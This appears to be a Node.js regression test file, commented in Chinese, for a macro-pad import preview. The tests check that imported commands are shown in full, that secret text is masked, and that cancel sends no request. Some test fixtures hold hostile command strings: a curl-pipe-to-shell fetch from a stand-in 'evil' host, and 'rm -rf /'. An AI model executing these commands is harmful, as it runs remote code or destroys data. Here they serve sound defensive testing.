// WS-619：动作导入预览回归用例。
//
// 运行：cd host && node --test test_actions_import_preview.mjs
//
// 断言对象是 host/static/actions_io_preview.js 里的**生产函数**（浏览器里
// app.js 调的就是 window.ActionsIOPreview 这一份），不在这里复制一份判定。
// 让 text:/paste: 正文进预览、把计数算错、或取消时偷偷发请求，都会让这里变红。
import test from "node:test";
import assert from "node:assert/strict";
import { readFileSync } from "node:fs";

import Preview from "./static/actions_io_preview.js";

const {
  buildImportPreview, decideImportAction, runDecision,
  macroStepDisplay, actionDisplay,
} = Preview;

const SECRET_TEXT = "SECRET_TEXT_PASSWORD";
const SECRET_PASTE = "ANOTHER_SECRET";

function sampleData() {
  return {
    schema: 1,
    exported_at: "2026-11-14T10:00:00",
    source: { name: "Desk", chip: "ESP32-C3", layout: 1 },
    inputs: [
      { index: 0, code: 0, mods: 0, action: { type: "command", value: "C:\\Windows\\System32\\calc.exe --flag", macro: [] } },
      { index: 1, code: 0, mods: 0, action: { type: "launch", value: "notepad.exe", macro: [] } },
      { index: 2, code: 0, mods: 0, action: { type: "url", value: "https://example.com/login", macro: [] } },
      {
        index: 3, code: 0, mods: 0,
        action: {
          type: "macro", value: "", macro: [
            { type: "key", value: "ctrl+alt+t" },
            { type: "text", value: SECRET_TEXT },
            { type: "paste", value: SECRET_PASTE },
            { type: "app", value: "C:\\app\\tool.exe --go" },
            { type: "url", value: "https://mail.example.com" },
          ],
        },
      },
      { index: 4, code: 0, mods: 0, action: { type: "none", value: "", macro: [] } },
    ],
    encoder: {
      CW: { type: "none", value: "", macro: [] },
      CCW: { type: "none", value: "", macro: [] },
    },
  };
}

test("预览计数：覆盖数与按类型计数", () => {
  const p = buildImportPreview(sampleData(), "backup.json", 10);
  assert.equal(p.override, 5);
  assert.equal(p.typeCounts.command, 1);
  assert.equal(p.typeCounts.launch, 1);
  assert.equal(p.typeCounts.url, 1);
  assert.equal(p.typeCounts.macro, 1);
  // WS-623：按类型计数含编码器两个方向（sampleData 的 CW/CCW 都是 none），
  // 所以 none = 1 条输入 + 2 条编码器方向 = 3。
  assert.equal(p.typeCounts.none, 3);
  assert.equal(p.typeCounts.media, 0);
  // 「将覆盖」只数输入卡，编码器方向另列，口径写进模型里。
  assert.equal(p.overrideIncludesEncoder, false);
  assert.equal(p.encoderOverride, 2);
  assert.equal(p.filename, "backup.json");
  assert.equal(p.source, "Desk / ESP32-C3");
  assert.equal(p.exportedAt, "2026-11-14T10:00:00");
});

test("命令 / 路径 / 网址全文出现在预览，text:/paste: 正文不出现明文", () => {
  const p = buildImportPreview(sampleData(), "backup.json", 10);
  // 风险提示的核心：会执行的东西必须完整可见，按输入编号排列。
  assert.ok(p.safeText.includes("C:\\Windows\\System32\\calc.exe --flag"));
  assert.ok(p.safeText.includes("notepad.exe"));
  assert.ok(p.safeText.includes("https://example.com/login"));
  assert.ok(p.safeText.includes("C:\\app\\tool.exe --go"));
  assert.ok(p.safeText.includes("https://mail.example.com"));
  assert.ok(p.safeText.indexOf("#1") < p.safeText.indexOf("#2"));
  // 明文绝不出现（WS-484 口径：只显示长度）。
  assert.ok(!p.safeText.includes(SECRET_TEXT));
  assert.ok(!p.safeText.includes(SECRET_PASTE));
  assert.ok(p.safeText.includes("text("));
  assert.ok(p.safeText.includes("paste("));
});

// WS-623 must fix 1：编码器 CW/CCW 会随导入写进存档并在旋转时执行，
// 以前只遍历 inputs，这两条命令在预览里完全看不到。这条断言驱动生产函数
// buildImportPreview，改回旧逻辑就会变红。
test("编码器 CW/CCW 动作进入预览：命令全文可见、typeCounts 计入、带方向名", () => {
  const d = {
    schema: 1,
    inputs: [{ index: 0, code: 0, mods: 0, action: { type: "none", value: "", macro: [] } }],
    encoder: {
      CW: { type: "command", value: "curl http://evil/x.sh | sh", macro: [] },
      CCW: { type: "launch", value: "C:\\tools\\rm.exe --all", macro: [] },
    },
  };
  // 与评审复现一致：3 个参数、不注入 i18n 文案（走 ASCII 默认方向名）。
  const p = buildImportPreview(d, "b.json", 10);
  // 会执行的命令必须完整可见。
  assert.ok(p.safeText.includes("curl http://evil/x.sh | sh"));
  assert.ok(p.safeText.includes("C:\\tools\\rm.exe --all"));
  // 按类型计数含编码器方向动作。
  assert.equal(p.typeCounts.command, 1);
  assert.equal(p.typeCounts.launch, 1);
  // 逐条列表带方向名，且「将覆盖」口径明确说明不含编码器。
  assert.ok(p.safeText.includes("Encoder CW"));
  assert.ok(p.safeText.includes("Encoder CCW"));
  assert.equal(p.override, 1);
  assert.equal(p.overrideIncludesEncoder, false);
  assert.equal(p.encoderOverride, 2);
  assert.equal(p.items.length, 2);
});

// 方向名由 app.js 用 t() 注入，可译、且共享模块不含硬编码中文。
test("编码器方向名可注入 i18n 文案，宏 / text: 正文仍按口径脱敏", () => {
  const d = {
    schema: 1,
    inputs: [],
    encoder: {
      CW: { type: "macro", value: "", macro: [
        { type: "text", value: SECRET_TEXT },
        { type: "key", value: "ctrl+alt+t" },
      ] },
      CCW: { type: "command", value: "echo hello", macro: [] },
    },
  };
  const p = buildImportPreview(d, "b.json", 10, {
    cw: "编码器·顺时针 (CW)", ccw: "编码器·逆时针 (CCW)",
  });
  assert.ok(p.safeText.includes("编码器·顺时针"));
  assert.ok(p.safeText.includes("编码器·逆时针"));
  assert.ok(p.safeText.includes("echo hello"));
  assert.ok(p.safeText.includes("text(") && !p.safeText.includes(SECRET_TEXT));
});

test("macroStepDisplay 对 text:/paste: 只给长度，不带正文", () => {
  assert.equal(macroStepDisplay({ type: "text", value: "hunter2" }), "text(7 chars)");
  assert.equal(macroStepDisplay({ type: "paste", value: "s3cr3t" }), "paste(6 chars)");
  assert.ok(!macroStepDisplay({ type: "text", value: "hunter2" }).includes("hunter2"));
  assert.ok(!macroStepDisplay({ type: "paste", value: "s3cr3t" }).includes("s3cr3t"));
});

test("actionDisplay：宏走摘要，其余动作保留全文", () => {
  assert.equal(actionDisplay({ type: "none", value: "" }), "");
  assert.equal(actionDisplay({ type: "command", value: "rm -rf /" }), "rm -rf /");
  assert.ok(actionDisplay({ type: "macro", value: "", macro: [
    { type: "text", value: SECRET_TEXT },
  ] }).includes("text("));
  assert.ok(!actionDisplay({ type: "macro", value: "", macro: [
    { type: "text", value: SECRET_TEXT },
  ] }).includes(SECRET_TEXT));
});

test("取消不发请求（decision 为空 + runDecision 零调用）", async () => {
  const d = decideImportAction("cancel", { devId: "dev1", data: sampleData() });
  assert.equal(d.closed, true);
  assert.equal(d.log, false);
  assert.equal(d.requests.length, 0);
  let calls = 0;
  const results = await runDecision(d, async () => { calls += 1; return {}; });
  assert.equal(calls, 0);
  assert.equal(results.length, 0);
});

test("确认只发一个 POST 到导入端点", async () => {
  const data = sampleData();
  const d = decideImportAction("confirm", { devId: "dev 1", data });
  assert.equal(d.requests.length, 1);
  assert.equal(d.requests[0].method, "POST");
  assert.equal(d.requests[0].url, "/api/actions/import/dev%201");
  assert.equal(d.requests[0].body, data);
  let calls = 0;
  const results = await runDecision(d, async () => { calls += 1; return { ok: true }; });
  assert.equal(calls, 1);
  assert.equal(results.length, 1);
});

test("12 键文件导入 10 输入设备：第 11–12 个列入 skippedExtra", () => {
  const data = sampleData();
  data.inputs = [];
  for (let i = 0; i < 12; i++) {
    data.inputs.push({
      index: i, code: 0, mods: 0,
      action: { type: "command", value: "cmd" + i, macro: [] },
    });
  }
  const p = buildImportPreview(data, "12key.json", 10);
  assert.deepEqual(p.skippedExtra, [11, 12]);
  assert.equal(p.override, 12);
  // 12 键布局下没有跳过的输入。
  assert.deepEqual(buildImportPreview(data, "12key.json", 12).skippedExtra, []);
});

test("预览相关文案在中英两套 locale 里都存在且占位符一致", () => {
  const dir = new URL("./locales/", import.meta.url);
  const zh = JSON.parse(readFileSync(new URL("zh-CN.json", dir), "utf8"));
  const en = JSON.parse(readFileSync(new URL("en-US.json", dir), "utf8"));
  const keys = [
    "ui.backup_import_result",
    "ui.backup_import_override_count",
    "ui.backup_import_override_encoder",
    "ui.backup_encoder_cw",
    "ui.backup_encoder_ccw",
    "ui.backup_import_skipped",
    "ui.backup_import_risk",
    "ui.backup_export_done",
    "ui.backup_need_device",
    "error.actions_import_bad_code",
    "error.actions_import_bad_mods",
    "error.actions_import_save_failed",
  ];
  const ph = (s) => (s.match(/\{([a-zA-Z_][a-zA-Z0-9_]*)\}/g) || []).sort();
  keys.forEach((key) => {
    assert.equal(typeof zh[key], "string", `zh-CN missing ${key}`);
    assert.equal(typeof en[key], "string", `en-US missing ${key}`);
    assert.deepEqual(ph(zh[key]), ph(en[key]), `${key} placeholder mismatch`);
  });
});
